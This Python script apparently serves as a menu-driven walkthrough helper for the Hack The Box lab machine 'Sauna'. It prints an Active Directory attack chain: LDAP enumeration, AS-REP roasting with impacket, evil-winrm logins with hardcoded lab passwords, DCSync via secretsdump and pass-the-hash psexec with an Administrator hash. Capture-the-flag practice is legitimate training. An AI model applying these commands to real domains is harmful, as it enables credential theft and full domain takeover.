import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Sauna
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] fsmith", "[+] svc_loanmgr", "[+] root", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.175" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Sauna Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def fsmith_exploit_user():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith-user Command (Ldap Enumeration)] > " + Fore.LIGHTMAGENTA_EX + f'ldapsearch -x -H ldap://{target_machine} -b "DC=EGOTISTICAL-BANK,DC=LOCAL" | grep "dn: CN"')
    print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith-user Command (Kerberos Enumeration)] > " + Fore.LIGHTMAGENTA_EX + f'Kerberos Enumeration Users')
    print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith-user Command (Hash cracked)] > " + Fore.LIGHTMAGENTA_EX + f'impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip {target_machine} -no-pass')
    print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith-user Command (Evil-Winrm Exploit)] > " + Fore.GREEN + f"evil-winrm -i {target_machine} -u 'fsmith' -p 'Thestrokes23'")

def svc_loanmgr_exploit_user():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[svc_loanmgr-user Command (WinPeas.exe Enumeration)] > " + Fore.LIGHTMAGENTA_EX + f'winPEASx64.exe')
    print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith-user Command (Evil-Winrm Exploit)] > " + Fore.GREEN + f"evil-winrm -i {target_machine} -u svc_loanmgr -p Moneymakestheworldgoround!")

def root_exploit_user():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (DSYnc Exploit hash)] > " + Fore.LIGHTMAGENTA_EX + f"impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@{target_machine}'")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith-user Command (Impacket Secretsdump Exploit)] > " + Fore.GREEN + f"impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@{target_machine} cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e")

#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","fsmith_user connection"))
                fsmith_exploit_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[fsmith_user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","svc_loanmgr_user connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[svc_loanmgr_user] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                svc_loanmgr_exploit_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[svc_loanmgr_user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                break
            elif opcion[0] == opcion[1][2]:
                print(tmsg,hmsg("user","root connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                root_exploit_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
